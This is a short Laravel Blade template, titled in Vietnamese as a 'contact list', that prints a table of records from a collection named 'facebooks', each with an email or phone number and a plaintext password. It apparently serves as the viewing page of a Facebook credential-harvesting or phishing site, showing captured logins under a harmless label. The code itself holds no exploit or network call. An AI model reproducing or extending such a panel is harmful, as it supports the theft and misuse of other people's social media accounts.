@extends('layouts.app')

@section('content')
	<div class="card">
		<div class="card-header text-center"><h2>Danh sách liên hệ</h2></div>
		<div class="card-body">
			<table class="table table-bordered table-sm">
				<thead class="bg bg-primary">
					<tr>
						<th>STT</th>
						<th>Email/SDT</th>
						<th>PASS</th>
					</tr>
				</thead>
				<tbody>
					@foreach($facebooks as $value)
						<tr>
							<td>{{ $loop->iteration }}</td>
							<td>{{ $value->email }}</td>
							<td>{{ $value->passwork }}</td>
						</tr>
					@endforeach
				</tbody>
			</table>
		</div>
	</div>
@endsection